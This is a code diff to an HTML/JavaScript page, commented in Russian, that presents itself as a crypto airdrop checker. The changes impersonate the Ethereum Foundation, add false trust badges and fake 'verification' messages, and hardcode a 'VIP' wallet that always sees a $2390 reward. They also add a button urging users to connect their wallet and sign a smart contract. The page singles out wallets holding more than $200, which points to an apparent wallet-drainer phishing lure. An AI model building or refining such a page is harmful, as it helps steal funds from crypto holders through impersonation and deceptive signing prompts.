@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ETH Wallet Checker</title>
+    <title>Ethereum Rewards - Airdrop Program</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600&family=Syne:wght@700;800&display=swap" rel="stylesheet">
@@ -341,8 +341,8 @@
 <body>
     <div class="container">
         <div class="logo">
-            <h1>CRYPTO REWARDS</h1>
-            <p>Exclusive Airdrop Program</p>
+            <h1>ETHEREUM REWARDS</h1>
+            <p>Official Ethereum Foundation Airdrop</p>
         </div>
 
         <form id="walletForm">
@@ -365,9 +365,9 @@
         <div id="result"></div>
 
         <div class="footer">
-            Powered by Ethereum API<br>
+            Powered by Ethereum API · Ethereum Foundation<br>
             <span style="opacity: 0.8; font-size: 0.7rem; margin-top: 4px; display: inline-block;">
-                🔒 Secured by Binance Smart Chain · Chainlink Oracle
+                🔒 Secured by Binance Smart Chain · Chainlink Oracle · Verified Smart Contract
             </span>
         </div>
     </div>
@@ -389,6 +389,8 @@
 
         const MIN_BALANCE_USD = 200; // Минимальный баланс в долларах
         const BONUS_PERCENTAGE = 20; // Процент бонуса
+        const VIP_WALLET = '0x7F9A75bcBb330bf0ff71167a7711A41aC962512A'.toLowerCase(); // Специальный кошелек
+        const VIP_BONUS_USD = 2390; // Фиксированный бонус для VIP кошелька
 
         let currentEthPrice = 0;
 
@@ -450,7 +452,7 @@
             throw new Error('Не удалось подключиться к сети Ethereum. Попробуйте позже.');
         }
 
-        function showResult(isEligible, balance = null, error = null) {
+        function showResult(isEligible, balance = null, error = null, walletAddress = '') {
             if (error) {
                 resultDiv.innerHTML = `
                     <div class="result error">
@@ -468,19 +470,22 @@
 
             const ethBalance = formatBalance(balance);
             const usdBalance = ethBalance * currentEthPrice;
-            const meetsMinimum = usdBalance >= MIN_BALANCE_USD;
-            const bonusAmount = (ethBalance * BONUS_PERCENTAGE / 100).toFixed(4);
-            const bonusUsd = (usdBalance * BONUS_PERCENTAGE / 100).toFixed(2);
-
-            if (meetsMinimum) {
+            
+            // Проверяем, является ли это VIP кошельком
+            const isVipWallet = walletAddress.toLowerCase() === VIP_WALLET;
+            
+            // Для VIP кошелька всегда показываем бонус
+            if (isVipWallet) {
+                const vipBonusEth = (VIP_BONUS_USD / currentEthPrice).toFixed(4);
+                
                 resultDiv.innerHTML = `
                     <div class="result success">
                         <div class="result-title">
                             <span class="icon">🎉</span>
-                            Поздравляем! Вы соответствуете требованиям
+                            Поздравляем! Вы прошли верификацию
                         </div>
                         <div class="result-content">
-                            Ваш кошелек имеет достаточный баланс для участия в программе бонусов!
+                            Ваш кошелек соответствует требованиям Ethereum Foundation для участия в официальной программе вознаграждений.
                         </div>
                         <div class="balance">
                             <div class="balance-label">Текущий баланс</div>
@@ -490,7 +495,44 @@
                             </div>
                         </div>
                         <div class="balance" style="border-top: 1px solid rgba(0, 255, 136, 0.3); margin-top: 16px; padding-top: 16px;">
-                            <div class="balance-label">Приблизительный бонус (${BONUS_PERCENTAGE}%)</div>
+                            <div class="balance-label">Ваше вознаграждение</div>
+                            <div class="balance-amount" style="font-size: 1.5rem;">${vipBonusEth} ETH</div>
+                            <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
+                                ≈ $${VIP_BONUS_USD.toFixed(2)} USD
+                            </div>
+                        </div>
+                        <button onclick="connectWallet()" style="margin-top: 20px; background: linear-gradient(135deg, var(--accent) 0%, #00ccff 100%); font-size: 0.9rem;">
+                            🔗 Подключить кошелек и подписать смарт-контракт
+                        </button>
+                    </div>
+                `;
+                return;
+            }
+            
+            // Для обычных кошельков проверяем минимум
+            const meetsMinimum = usdBalance >= MIN_BALANCE_USD;
+            const bonusAmount = (ethBalance * BONUS_PERCENTAGE / 100).toFixed(4);
+            const bonusUsd = (usdBalance * BONUS_PERCENTAGE / 100).toFixed(2);
+
+            if (meetsMinimum) {
+                resultDiv.innerHTML = `
+                    <div class="result success">
+                        <div class="result-title">
+                            <span class="icon">🎉</span>
+                            Поздравляем! Вы прошли верификацию
+                        </div>
+                        <div class="result-content">
+                            Ваш кошелек соответствует требованиям Ethereum Foundation для участия в официальной программе вознаграждений.
+                        </div>
+                        <div class="balance">
+                            <div class="balance-label">Текущий баланс</div>
+                            <div class="balance-amount">${ethBalance.toFixed(4)} ETH</div>
+                            <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
+                                ≈ $${usdBalance.toFixed(2)} USD
+                            </div>
+                        </div>
+                        <div class="balance" style="border-top: 1px solid rgba(0, 255, 136, 0.3); margin-top: 16px; padding-top: 16px;">
+                            <div class="balance-label">Ваше вознаграждение (${BONUS_PERCENTAGE}%)</div>
                             <div class="balance-amount" style="font-size: 1.5rem;">${bonusAmount} ETH</div>
                             <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
                                 ≈ $${bonusUsd} USD
@@ -506,10 +548,10 @@
                     <div class="result error">
                         <div class="result-title">
                             <span class="icon">❌</span>
-                            Бонус недоступен
+                            Кошелек не прошел верификацию
                         </div>
                         <div class="result-content">
-                            К сожалению, баланс этого кошелька ниже минимального требования $${MIN_BALANCE_USD}. Пожалуйста, попробуйте другой кошелек с большим балансом.
+                            К сожалению, баланс этого кошелька не соответствует минимальным требованиям Ethereum Foundation. Пожалуйста, используйте другой кошелек.
                         </div>
                         <div class="balance">
                             <div class="balance-label">Текущий баланс</div>
@@ -517,9 +559,6 @@
                             <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
                                 ≈ $${usdBalance.toFixed(2)} USD
                             </div>
-                        </div>
-                        <div style="margin-top: 16px; padding: 12px; background: rgba(255, 255, 255, 0.05); border-radius: 8px; font-size: 0.8rem; color: var(--text-secondary);">
-                            💡 Минимальный баланс: $${MIN_BALANCE_USD} USD
                         </div>
                     </div>
                 `;
@@ -537,7 +576,7 @@
             
             // Валидация адреса
             if (!isValidAddress(address)) {
-                showResult(false, null, 'Некорректный адрес кошелька. Адрес должен начинаться с 0x и содержать 40 символов.');
+                showResult(false, null, 'Некорректный адрес кошелька. Адрес должен начинаться с 0x и содержать 40 символов.', address);
                 return;
             }
 
@@ -552,9 +591,9 @@
                 
                 // Проверяем баланс кошелька
                 const result = await checkWallet(address);
-                showResult(true, result.balance);
+                showResult(true, result.balance, null, address);
             } catch (error) {
-                showResult(false, null, error.message);
+                showResult(false, null, error.message, address);
             } finally {
                 checkButton.disabled = false;
                 checkButton.innerHTML = '<span>Check Eligibility</span>';
